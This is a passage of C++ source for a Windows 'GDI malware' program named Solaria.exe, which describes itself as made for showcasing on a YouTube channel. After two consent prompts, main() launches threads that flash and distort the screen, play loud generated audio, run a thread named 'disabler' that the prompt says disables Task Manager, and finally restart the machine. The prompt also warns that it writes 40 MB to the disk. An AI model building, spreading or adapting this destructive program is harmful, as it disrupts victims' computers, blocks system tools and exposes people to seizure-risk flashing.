        SetBitmapBits(hbm, w * h * 4, data);
        BitBlt(desk, 0, 0, w, h, hdcdc, 0, 0, SRCCOPY);
        DeleteObject(hbm);
        DeleteObject(hdcdc);
        DeleteObject(desk);
    }
    return 0;
} 

VOID WINAPI AudioFx12() {
	HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 10] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(((t*rand()>>9)|t)*cos(t>>6)); //sualorz

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}


int main() {
	HWND hWnd = GetDesktopWindow();
	if (MessageBoxW(hWnd, L"WARNING!\r\nYou're about to run Solaria.exe, a malware made to be showcased on the TM_DS channel on YouTube.\r\nIt displays flashing lights, plays loud sounds, disables Task Manager and writes 40 MB to the hard drive!\r\n\r\nTubercomiosis99 and shysb are not responsible for any damages made by running this program or reverse-engineering it.\r\nExecute the malware?", L"WARNING!!", MB_YESNO | MB_ICONEXCLAMATION | MB_SYSTEMMODAL | MB_DEFBUTTON2) == IDNO)
	{
		return 0;
	}
	else
	{
		if (MessageBoxW(hWnd, L"FINAL WARNING!!!\r\n\r\nIf you have read the previous warning, you know about the negative consequences the malware will do!\r\nTubercomiosis99 and shysb are not responsible for any damages made by using this malware in any way!\r\nProceed with running anyway?", L"FINAL WARNING", MB_YESNO | MB_ICONWARNING | MB_SYSTEMMODAL | MB_DEFBUTTON2) == IDNO)
		{
			return 0;
		}
		else
		{
			Sleep(1000);
			CreateThread(0, 0, (LPTHREAD_START_ROUTINE)fakeerror, 0, 0, 0);
			Sleep(1000);
			CreateThread(0, 0, (LPTHREAD_START_ROUTINE)disabler, 0, 0, 0);
			HANDLE a = CreateThread(0, 0, payload, 0, 0, 0);
			HANDLE aa = CreateThread(0, 0, sharpening, 0, 0, 0);
			AudioFx1();
			Sleep(20000);
			refresh();
			HANDLE aaa = CreateThread(0, 0, stretch, 0, 0, 0);
			HANDLE aaaa = CreateThread(0, 0, hsl, 0, 0, 0);
			AudioFx2();
			Sleep(20000);
			refresh();
			kill(a);
			kill(aa);
			kill(aaa);
			kill(aaaa);
			HANDLE b = CreateThread(0, 0, xorhsl, 0, 0, 0);
			HANDLE bb = CreateThread(0, 0, glitch, 0, 0, 0);
			AudioFx3();
			Sleep(15000);
			refresh();
			kill(b);
			kill(bb);
			HANDLE c = CreateThread(0, 0, circling, 0, 0, 0);
			HANDLE cc = CreateThread(0, 0, circle, 0, 0, 0);
			HANDLE ccc = CreateThread(0, 0, square, 0, 0, 0);
			HANDLE cccc = CreateThread(0, 0, patblt, 0, 0, 0);
			Sleep(34000);
			kill(cc);
			kill(ccc);
			kill(cccc);
			refresh();
			HANDLE d = CreateThread(0, 0, shader, 0, 0, 0);
			HANDLE dd = CreateThread(0, 0, mashing, 0, 0, 0);
			AudioFx5();
			Sleep(23000);
			kill(c);
			kill(d);
			kill(dd);
			refresh();
			HANDLE e = CreateThread(0, 0, cube, 0, 0, 0);
			HANDLE ee = CreateThread(0, 0, hsl, 0, 0, 0);
			HANDLE eee = CreateThread(0, 0, melter, 0, 0, 0);
			AudioFx7();
			Sleep(30000);
			kill(e);
			kill(ee);
			kill(eee);
			refresh();
			HANDLE f = CreateThread(0, 0, splitter, 0, 0, 0);
			HANDLE ff = CreateThread(0, 0, glitch, 0, 0, 0);
			AudioFx8();
			Sleep(20000);
			kill(f);
			kill(ff);
			refresh();
			HANDLE g = CreateThread(0, 0, squareblt, 0, 0, 0);
			HANDLE gg = CreateThread(0, 0, circling, 0, 0, 0);
			HANDLE ggg = CreateThread(0, 0, hsl, 0, 0, 0);
			AudioFx9();
			Sleep(20000);
			kill(ggg);
			refresh();
			HANDLE h = CreateThread(0, 0, stretch, 0, 0, 0);
			Sleep(30000);
			kill(h);
			refresh();
			HANDLE i = CreateThread(0, 0, roto, 0, 0, 0);
			HANDLE ii = CreateThread(0, 0, payload, 0, 0, 0);
			HANDLE iii = CreateThread(0, 0, pat, 0, 0, 0);
			HANDLE iiii = CreateThread(0, 0, squares, 0, 0, 0);
			AudioFx10();
			Sleep(35000);
			kill(i);
			kill(ii);
			refresh();
			HANDLE j = CreateThread(0, 0, melter, 0, 0, 0);
			HANDLE jj = CreateThread(0, 0, hsl, 0, 0, 0);
			HANDLE jjj = CreateThread(0, 0, squareblt, 0, 0, 0);
			AudioFx11();
			Sleep(26000);
			kill(iii);
			kill(iiii);
			kill(j);
			kill(jj);
			HANDLE k = CreateThread(0, 0, rgbquad, 0, 0, 0);
			HANDLE kk = CreateThread(0, 0, roto, 0, 0, 0);
			AudioFx12();
			Sleep(10000);
			kill(jjj);
			kill(k);
			kill(kk);
			refresh();
			Sleep(1000);
			Restart();
		}
	}
}
